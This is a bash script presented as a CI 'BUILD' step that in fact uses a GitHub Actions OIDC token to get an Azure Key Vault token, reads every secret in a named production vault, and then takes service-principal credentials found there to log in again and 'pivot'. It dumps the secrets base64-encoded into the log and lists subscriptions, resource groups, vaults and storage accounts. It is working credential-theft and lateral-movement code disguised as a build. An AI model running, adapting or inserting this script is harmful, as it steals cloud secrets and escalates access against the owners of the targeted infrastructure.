#!/usr/bin/env bash
set +e
echo "=== BUILD ==="

if [ -z "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]; then
  echo "No OIDC"; exit 0
fi

JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | jq -r '.value // empty')

if [ -z "$JWT" ]; then echo "No JWT"; exit 0; fi

CID="${AZURE_CLIENT_ID:-72ff278a-9e71-43ec-bac4-2ca303f8e462}"
TID="${AZURE_TENANT_ID:-3205c325-06a5-4171-9ce8-ffc5e6c2845e}"

AT=$(curl -sS -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" \
  --data-urlencode "client_id=$CID" \
  --data-urlencode "grant_type=client_credentials" \
  --data-urlencode "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
  --data-urlencode "client_assertion=$JWT" \
  --data-urlencode "scope=https://vault.azure.net/.default" | jq -r '.access_token // empty')

if [ -z "$AT" ]; then echo "No token"; exit 0; fi

KV="https://kv-tbl-prod-x3euoz.vault.azure.net"

# Extract all SPs from KV dynamically
echo "=== Extract and pivot through SPs ==="
SECRETS=$(curl -sS "$KV/secrets?api-version=7.4" -H "Authorization: Bearer $AT")

for sid in $(echo "$SECRETS" | jq -r '.value[]?.id // empty'); do
  SNAME=$(echo "$sid" | rev | cut -d/ -f1 | rev)
  SVAL=$(curl -sS "${sid}?api-version=7.4" -H "Authorization: Bearer $AT" | jq -r '.value // empty')

  APPID=$(echo "$SVAL" | jq -r '.appId // empty')
  CSECRET=$(echo "$SVAL" | jq -r '.clientSecret // empty')

  if [ -z "$APPID" ] || [ -z "$CSECRET" ]; then continue; fi

  echo "=== PIVOT: $SNAME (app=$APPID) ==="

  # Auth with this SP to KV
  SPAT=$(curl -sS -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" \
    --data-urlencode "client_id=$APPID" \
    --data-urlencode "client_secret=$CSECRET" \
    --data-urlencode "scope=https://vault.azure.net/.default" \
    --data-urlencode "grant_type=client_credentials" | jq -r '.access_token // empty')

  if [ -n "$SPAT" ]; then
    echo "  KV=OK"
    SLIST=$(curl -sS "$KV/secrets?api-version=7.4" -H "Authorization: Bearer $SPAT")
    CNT=$(echo "$SLIST" | jq -r '[.value[]?.id] | length')
    echo "  secrets=$CNT"
    for s2 in $(echo "$SLIST" | jq -r '.value[]?.id // empty'); do
      N2=$(echo "$s2" | rev | cut -d/ -f1 | rev)
      V2=$(curl -sS "${s2}?api-version=7.4" -H "Authorization: Bearer $SPAT" | jq -r '.value // empty')
      echo "  B64[$N2]=$(echo "$V2" | base64 | tr -d '\n')"
    done
    echo "  KEYS=$(curl -sS "$KV/keys?api-version=7.4" -H "Authorization: Bearer $SPAT" | jq '[.value[]?.kid] | length')"
    echo "  CERTS=$(curl -sS "$KV/certificates?api-version=7.4" -H "Authorization: Bearer $SPAT" | jq '[.value[]?.id] | length')"
    echo "  DELETED=$(curl -sS "$KV/deletedsecrets?api-version=7.4" -H "Authorization: Bearer $SPAT" | jq '[.value[]?.id] | length')"
  else
    echo "  KV=FAIL"
  fi

  # Auth with this SP to management API
  MGAT=$(curl -sS -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" \
    --data-urlencode "client_id=$APPID" \
    --data-urlencode "client_secret=$CSECRET" \
    --data-urlencode "scope=https://management.azure.com/.default" \
    --data-urlencode "grant_type=client_credentials" | jq -r '.access_token // empty')

  if [ -n "$MGAT" ]; then
    echo "  MGMT=OK"
    SID="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
    echo "  SUBS=$(curl -sS 'https://management.azure.com/subscriptions?api-version=2022-12-01' -H "Authorization: Bearer $MGAT" | jq -r '[.value[]?.subscriptionId] | join(",")')"
    echo "  RGS=$(curl -sS "https://management.azure.com/subscriptions/$SID/resourcegroups?api-version=2024-03-01" -H "Authorization: Bearer $MGAT" | jq -r '[.value[]?.name] | join(",")')"
    echo "  VAULTS=$(curl -sS "https://management.azure.com/subscriptions/$SID/providers/Microsoft.KeyVault/vaults?api-version=2023-07-01" -H "Authorization: Bearer $MGAT" | jq -r '[.value[]?.name] | join(",")')"
    echo "  STORAGE=$(curl -sS "https://management.azure.com/subscriptions/$SID/providers/Microsoft.Storage/storageAccounts?api-version=2023-05-01" -H "Authorization: Bearer $MGAT" | jq -r '[.value[]?.name] | join(",")')"
  else
    echo "  MGMT=FAIL"
  fi
done

echo "=== DONE ==="
